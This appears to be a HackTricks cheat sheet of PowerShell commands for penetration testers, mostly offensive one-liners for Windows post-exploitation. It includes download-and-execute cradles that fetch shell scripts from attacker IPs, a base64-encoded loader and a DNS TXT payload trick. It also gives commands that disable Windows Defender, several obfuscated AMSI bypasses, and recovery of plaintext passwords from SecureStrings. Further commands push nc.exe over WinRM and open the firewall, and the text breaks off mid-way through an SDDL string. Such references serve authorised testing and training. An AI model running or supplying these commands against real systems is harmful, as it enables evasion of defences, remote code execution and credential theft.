        "text": "Basic PowerShell for Pentesters\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nDefault PowerShell locations\nC:\\windows\\syswow64\\windowspowershell\\v1\n.\n0\\powershell\nC:\\Windows\\System32\\WindowsPowerShell\\v1\n.\n0\\powershell\nBasic PS commands to start\nGet-Help\n*\n#List everything loaded\nGet-Help\nprocess\n#List everything containing \"process\"\nGet-Help\nGet-Item\n-\nFull\n#Get full helpabout a topic\nGet-Help\nGet-Item\n-\nExamples\n#List examples\nImport-Module\n<modulepath>\nGet-Command\n-\nModule <modulename>\nDownload & Execute\ng\necho\nIEX\n(\nNew-Object\nNet\n.\nWebClient\n).\nDownloadString\n(\n'http://10.10.14.13:8000/PowerUp.ps1'\n)\n|\npowershell\n-\nnoprofile\n-\n#From cmd download and execute\npowershell\n-\nexec bypass\n-\nc\n\"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex\"\niex\n(\niwr\n'10.10.14.9:8000/ipw.ps1'\n)\n#From PSv3\n‚Äã\n$h\n=\nNew-Object\n-\nComObject Msxml2\n.\nXMLHTTP\n;\n$h\n.\nopen\n(\n'GET'\n,\n'http://10.10.14.9:8000/ipw.ps1'\n,\n$false\n);\n$h\n.\nsend\n();\niex\n$h\n.\nresponseText\n$wr\n=\n[System.NET.WebRequest]\n::Create\n(\n\"http://10.10.14.9:8000/ipw.ps1\"\n)\n$r\n=\n$wr\n.\nGetResponse\n()\nIEX\n(\n[System.IO.StreamReader]\n(\n$r\n.\nGetResponseStream\n())).\nReadToEnd\n(\n‚Äã\n#https://twitter.com/Alh4zr3d/status/1566489367232651264\n#host a text record with your payload at one of your (unburned) domains and do this:\npowershell\n.\n(\nnslookup\n-\nq=txt http:\n//\nsome\n.\nowned\n.\ndomain\n.\ncom\n)[\n-\n1\n]\nDownload & Execute in background with AMSI Bypass\nStart-Process\n-\nNoNewWindow powershell\n\"-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=\"\nUsing b64 from linux\necho\n-\nn\n\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')\"\n|\niconv\n-\nt UTF-16LE\n|\nbase64\n-\nw 0\npowershell\n-\nnop\n-\nenc <BASE64_ENCODED_PAYLOAD>\nDownload\nSystem.Net.WebClient\n(\nNew-Object\nNet\n.\nWebClient\n).\nDownloadFile\n(\n\"http://10.10.14.2:80/taskkill.exe\"\n,\n\"C:\\Windows\\Temp\\taskkill.exe\"\n)\nInvoke-WebRequest\nInvoke-WebRequest\n\"http://10.10.14.2:80/taskkill.exe\"\n-\nOutFile\n\"taskkill.exe\"\nWget\nwget\n\"http://10.10.14.2/nc.bat.exe\"\n-\nOutFile\n\"C:\\ProgramData\\unifivideo\\taskkill.exe\"\nBitsTransfer\nImport-Module\nBitsTransfer\nStart-BitsTransfer\n-\nSource\n$url\n-\nDestination\n$output\n# OR\nStart-BitsTransfer\n-\nSource\n$url\n-\nDestination\n$output\n-\nAsynchronous\nBase64 Kali & EncodedCommand\nkali>\necho\n-\nn\n\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')\"\n|\niconv\n--\nto-code UTF-16LE\n|\nbase64\n-\nw0\nPS\n> powershell\n-\nEncodedCommand <Base64>\n‚Äã\nExecution Policy\n‚Äã\n‚Äã\nConstrained language\n‚Äã\n‚Äã\nAppLocker Policy\n‚Äã\nEnable WinRM (Remote PS)\nenable-psremoting\n-\nforce\n#This enables winrm\n‚Äã\n# Change NetWorkConnection Category to Private\n#Requires -RunasAdministrator\n‚Äã\nGet-NetConnectionProfile\n|\nWhere\n{\n$_\n.\nNetWorkCategory\n-ne\n'Private'\n}\n|\nForEach\n{\n$_\n$_\n|\nSet-NetConnectionProfile\n-\nNetWorkCategory Private\n-\nConfirm\n}\nDisable Defender\n# Check status\nGet-MpComputerStatus\nGet-MpPreference\n|\nselect\nExclusion*\n|\nfl\n#Check exclusions\n# Disable\nSet-MpPreference\n-\nDisableRealtimeMonitoring\n$true\n#To completely disable Windows Defender on a computer, use the command:\nNew-ItemProperty\n-\nPath\n\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\"\n-\nName DisableAntiSpyware\n-\nValue 1\n-\nPropertyType DWORD\n-\nForce\n# Set exclusion path\nSet-MpPreference\n-\nExclusionPath\n(\npwd\n)\n-\ndisablerealtimemonitoring\nAdd-MpPreference\n-\nExclusionPath\n(\npwd\n)\n‚Äã\n# Check exclusions configured via GPO\nParse-PolFile\n.\n\\Registry\n.\npol\n‚Äã\nKeyName : Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\nValueName : Exclusions_Paths\nValueType : REG_DWORD\nValueLength : 4\nValueData : 1\n‚Äã\nKeyName : Software\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\nValueName : C:\\Windows\\Temp\nValueType : REG_SZ\nValueLength : 4\nValueData : 0\nAMSI bypass\namsi.dll\nis\nloaded\ninto your process, and has the necessary\nexports\nfor any application interact with. And because it's loaded into the memory space of a process you\ncontrol\n, you can change its behaviour by\noverwriting instructions in memory\n. Making it not detect anything.\nTherefore, the goal of the AMSI bypasses you will are to\noverwrite the instructions of that DLL in memory to make the detection useless\n.\nAMSI bypass generator\nweb page:\nhttps://amsi.fail/\n‚Äã\n# A Method\n[Ref]\n.\nAssembly\n.\nGetType\n(\n'System.Management.Automation.Ams'\n+\n'iUtils'\n).\nGetField\n(\n'am'\n+\n'siInitFailed'\n,\n'NonPu'\n+\n'blic,Static'\n).\nSetValue\n(\n$null\n,\n$true\n)\n‚Äã\n# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1\n$A\n=\n\"5492868772801748688168747280728187173688878280688776828\"\n$B\n=\n\"1173680867656877679866880867644817687416876797271\"\n[Ref]\n.\nAssembly\n.\nGetType\n(\n[string]\n(\n0\n..\n37\n|\n%\n{\n[char][int]\n(\n29+\n(\n$A\n+\n$B\n).\nsubstring\n((\n$_\n*\n2\n),\n2\n))})\n-replace\n\" \"\n).\nGetField\n(\n[string]\n(\n38\n..\n51\n|\n%\n{\n[char][int]\n(\n29+\n(\n$A\n+\n$B\n).\nsubstring\n((\n$_\n*\n2\n),\n2\n))})\n-replace\n\" \"\n,\n'NonPublic,Static'\n).\nSetValue\n(\n$null\n,\n$true\n)\n‚Äã\n# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI\n[Ref]\n.\nAssembly\n.\nGetType\n(\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=='\n)))).\nGetField\n(\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='\n))),\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA='\n)))).\nSetValue\n(\n$null\n,\n$true\n)\n‚Äã\n# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI\n&\n(\n$SHELLid\n[\n1\n]\n+\n$SHELlId\n[\n13\n]\n+\n'X'\n)\n(\nNeW-OBJEct\nsYStEm\n.\niO\n.\ncoMPrESSIOn\n.\ndefLAtEstReam\n(\n[iO.meMorYStReAm]\n[cOnvErt]\n::froMBaSE64StRINg\n(\n'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'\n),\n[sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]\n::decOMPRESs\n)\n|\nforeAch\n{\nNeW-OBJEct\niO\n.\nSTREaMREadER\n(\n$_\n,\n[teXt.ENCoDiNg]\n::aScii\n)}).\nREadtoenD\n(\n)\n‚Äã\n# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI\n$\n{\n2\n}\n=\n[Ref]\n.\nAssembly\n.\nGetType\n(\n'Sy'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'cwB0AGUA'\n)))\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'bQAuAE0A'\n)))\n+\n'an'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'YQBnAGUA'\n)))\n+\n'm'\n+\n'en'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'dAAuAEEAdQA='\n)))\n+\n't'\n+\n'om'\n+\n'at'\n+\n'io'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'bgAuAEEA'\n)))\n+\n'ms'\n+\n'i'\n+\n'U'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'dABpAGwA'\n)))\n+\n's'\n)\n$\n{\n1\n}\n=$\n{\n2\n}.\nGetField\n(\n'am'\n+\n's'\n+\n'iI'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'bgBpAHQA'\n)))\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'RgBhAGkAbAA='\n)))\n+\n'ed'\n,\n'No'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'bgBQAHUA'\n)))\n+\n'bl'\n+\n'i'\n+\n$\n(\n[Text.Encoding]\n::Unicode\n.\nGetString\n(\n[Convert]\n::FromBase64String\n(\n'YwAsAFMA'\n)))\n+\n'ta'\n+\n'ti'\n+\n'c'\n)\n$\n{\n1\n}.\nSetValue\n(\n$null\n,\n$true\n)\n‚Äã\n# Another Method\n$a\n=\n'System.Management.Automation.A'\n;\n$b\n=\n'ms'\n;\n$u\n=\n'Utils'\n$assembly\n=\n[Ref]\n.\nAssembly\n.\nGetType\n((\n'{0}{1}i{2}'\n-\nf\n$a\n,\n$b\n,\n$u\n))\n$field\n=\n$assembly\n.\nGetField\n((\n'a{0}iInitFailed'\n-\nf\n$b\n),\n'NonPublic,Static'\n)\n$field\n.\nSetValue\n(\n$null\n,\n$true\n)\n‚Äã\n# AMSI Bypass in python\nhttps:\n//\nfluidattacks\n.\ncom/blog/amsi-bypass-python/\n‚Äã\n# Testing for Amsi Bypass:\nhttps:\n//\ngithub\n.\ncom/rasta-mouse/AmsiScanBufferBypass\n‚Äã\n# Amsi-Bypass-Powershell\nhttps:\n//\ngithub\n.\ncom/S3cur3Th1sSh1t/Amsi-Bypass-Powershell\n‚Äã\nhttps:\n//\nblog\n.\nf-secure\n.\ncom/hunting-\nfor\n-\namsi-bypasses/\nhttps:\n//\nwww\n.\nmdsec\n.\nco\n.\nuk/2018/06/exploring-powershell-amsi-and-logging-evasion/\nhttps:\n//\ngithub\n.\ncom/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans\nhttps:\n//\nslaeryan\n.\ngithub\n.\nio/posts/falcon-zero-alpha\n.\nhtml\nAMSI Bypass 2 - Managed API Call Hooking\nCheck\nthis post for detailed info\n‚Äã\nand the code\n.\nThis new technique relies upon API call hooking of .NET methods. As it turns out, .NET Methods need to get compiled down to native machine instructions in memory which end up looking very similar to native methods. These compiled methods can hooked to change the control flow of a program.\nThe steps performing API cal hooking of .NET methods are:\n1.\nIdentify the target method to hook\n2.\nDefine a method with the same function prototype as the target\n3.\nUse reflection to find the methods\n4.\nEnsure each method has been compiled\n5.\nFind the location of each method in memory\n6.\nOverwrite the target method with instructions pointing to our malicious method\nAMSI Bypass 3 - SeDebug Privilege\n‚Äã\nFollowing this guide & code\nyou can see how with enough privileges to debug processes, you can spawn a powershell.exe process, debug it, monitor when it loads\namsi.dll\nand disable it.\nPS-History\nGet-Content\nC:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history\n.\ntxt\nGet permissions\nGet-Acl\n-\nPath\n\"C:\\Program Files\\Vuln Services\"\n|\nfl\nOS version and HotFixes\n[System.Environment]\n::OSVersion\n.\nVersion\n#Current OS version\nGet-WmiObject\n-\nquery\n'select * from win32_quickfixengineering'\n|\nforeach\n{\n$_\n.\nhotfixid\n}\n#List all patches\nGet-Hotfix\n-\ndescription\n\"Security update\"\n#List only \"Security Update\" patches\nEnvironment\nGet-ChildItem\nEnv:\n|\nft\nKey\n,\nValue\n#get all values\n$env\n:UserName @Get UserName value\nOther connected drives\nGet-PSDrive\n|\nwhere\n{\n$_\n.\nProvider\n-like\n\"Microsoft.PowerShell.Core\\FileSystem\"\n}|\nft\nName\n,\nRoot\nRecycle Bin\n$shell\n=\nNew-Object\n-\ncom shell\n.\napplication\n$rb\n=\n$shell\n.\nNamespace\n(\n10\n)\n$rb\n.\nItems\n()\n‚Äã\nhttps://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/\n‚Äã\nDomain Recon\nPowerView/SharpView\nUsers\nGet-LocalUser\n|\nft\nName\n,\nEnabled\n,\nDescription\n,\nLastLogon\nGet-ChildItem\nC:\\Users\n-\nForce\n|\nselect\nName\nSecure String to Plaintext\n$pass\n=\n\"01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\"\n|\nconvertto-securestring\n$user\n=\n\"HTB\\Tom\"\n$cred\n=\nNew-Object\nSystem\n.\nmanagement\n.\nAutomation\n.\nPSCredential\n(\n$user\n,\n$pass\n)\n$cred\n.\nGetNetworkCredential\n()\n|\nfl\n‚Äã\nUserName       : Tom\nPassword       : 1ts-mag1c!\n!!\nSecurePassword : System\n.\nSecurity\n.\nSecureString\nDomain         : HTB\nOr directly parsing form XML:\n$cred\n=\nImport-CliXml\n-\nPath cred\n.\nxml\n;\n$cred\n.\nGetNetworkCredential\n()\n|\nFormat-List\n*\n‚Äã\nUserName       : Tom\nPassword       : 1ts-mag1c!\n!!\nSecurePassword : System\n.\nSecurity\n.\nSecureString\nDomain         : HTB\nSUDO\n#CREATE A CREDENTIAL OBJECT\n$pass\n=\nConvertTo-SecureString\n'<PASSWORD>'\n-\nAsPlainText\n-\nForce\n$cred\n=\nNew-Object\nSystem\n.\nManagement\n.\nAutomation\n.\nPSCredential\n(\n\"<USERNAME>\"\n,\n$pass\n)\n‚Äã\n#For local:\nStart-Process\n-\nCredential\n(\n$cred\n)\n-\nNoNewWindow powershell\n\"iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')\"\n‚Äã\n#For WINRM\n#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)\nInvoke-Command\n-\nComputer ARKHAM\n-\nScriptBlock\n{\nwhoami\n}\n-\nCredential\n$cred\n#DOWNLOAD nc.exe\nInvoke-Command\n-\nComputer ARKHAM\n-\nScriptBlock\n{\nIWR\n-\nuri 10\n.\n10\n.\n14\n.\n17/nc\n.\nexe\n-\noutfile nc\n.\nexe\n}\n-\ncredential\n$cred\n‚Äã\nStart-Process\npowershell\n-\nCredential\n$pp\n-\nArgumentList\n'-noprofile -command &{Start-Process C:\\xyz\\nc.bat -verb Runas}'\n‚Äã\n#Another method\n$secpasswd\n=\nConvertTo-SecureString\n\"<password>\"\n-\nAsPlainText\n-\nForce\n$mycreds\n=\nNew-Object\nSystem\n.\nManagement\n.\nAutomation\n.\nPSCredential\n(\n\"<user>\"\n,\n$secpasswd\n)\n$computer\n=\n\"<hostname>\"\nGroups\nGet-LocalGroup\n|\nft\nName\n#All groups\nGet-LocalGroupMember\nAdministrators\n|\nft\nName\n,\nPrincipalSource\n#Members of Administrators\nClipboard\nGet-Clipboard\nProcesses\nGet-Process\n|\nwhere\n{\n$_\n.\nProcessName\n-notlike\n\"svchost*\"\n}\n|\nft\nProcessName\n,\nId\nServices\nGet-Service\nPassword from secure string\n$pw\n=\ngc\nadmin-pass\n.\nxml\n|\nconvertto-securestring\n#Get the securestring from the file\n$cred\n=\nnew-object\nsystem\n.\nmanagement\n.\nautomation\n.\npscredential\n(\n\"administrator\"\n,\n$pw\n)\n$cred\n.\ngetnetworkcredential\n()\n|\nfl\n*\n#Get plaintext password\nScheduled Tasks\nGet-ScheduledTask\n|\nwhere\n{\n$_\n.\nTaskPath\n-notlike\n\"\\Microsoft*\"\n}\n|\nft\nTaskName\n,\nTaskPath\n,\nState\nNetwork\nInterfaces\nGet-NetIPConfiguration\n|\nft\nInterfaceAlias\n,\nInterfaceDescription\n,\nIPv4Address\nGet-DnsClientServerAddress\n-\nAddressFamily IPv4\n|\nft\nFirewall\nGet-NetFirewallRule\n-\nEnabled True\n‚Äã\nGet-NetFirewallRule\n-\nDirection Outbound\n-\nEnabled True\n-\nAction Block\nGet-NetFirewallRule\n-\nDirection Outbound\n-\nEnabled True\n-\nAction Allow\nGet-NetFirewallRule\n-\nDirection Inbound\n-\nEnabled True\n-\nAction Block\nGet-NetFirewallRule\n-\nDirection Inbound\n-\nEnabled True\n-\nAction Allow\n‚Äã\n# Open SSH to the world\nNew-NetFirewallRule\n-\nDisplayName\n'SSH (Port 22)'\n-\nDirection Inbound\n-\nLocalPort 22\n-\nProtocol TCP\n-\nAction Allow\n‚Äã\n# Get name, proto, local and rremote ports, remote address, penable,profile and direction\n## You can user the following line changing the initial filters to indicat a difefrent direction or action\nGet-NetFirewallRule\n-\nDirection Outbound\n-\nEnabled True\n-\nAction Block\n|\nFormat-Table\n-\nProperty  DisplayName\n,\n@\n{\nName=\n'Protocol'\n;\nExpression=\n{(\n$PSItem\n|\nGet-NetFirewallPortFilter\n).\nProtocol\n}},\n@\n{\nName=\n'LocalPort'\n;\nExpression=\n{(\n$PSItem\n|\nGet-NetFirewallPortFilter\n).\nLocalPort\n}},\n@\n{\nName=\n'RemotePort'\n;\nExpression=\n{(\n$PSItem\n|\nGet-NetFirewallPortFilter\n).\nRemotePort\n}},\n@\n{\nName=\n'RemoteAddress'\n;\nExpression=\n{(\n$PSItem\n|\nGet-NetFirewallAddressFilter\n).\nRemoteAddress\n}},\nProfile\n,\nDirection\n,\nAction\nRoute\nroute print\nARP\nGet-NetNeighbor\n-\nAddressFamily IPv4\n|\nft\nifIndex\n,\nIPAddress\n,\nLinkLayerAddress\n,\nState\nHosts\nGet-Content\nC:\\WINDOWS\\System32\\drivers\\etc\\hosts\nPing\n$ping\n=\nNew-Object\nSystem\n.\nNet\n.\nNetworkinformation\n.\nPing\n1\n..\n254\n|\n%\n{\n$ping\n.\nsend\n(\n\"10.9.15.\n$_\n\"\n)\n|\nselect\naddress\n,\nstatus\n}\nSNMP\nGet-ChildItem\n-\npath HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP\n-\nRecurse\nConverting the SDDL String into a Readable Format\nPS\nC:\\>\nConvertFrom-SddlString\n\"O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-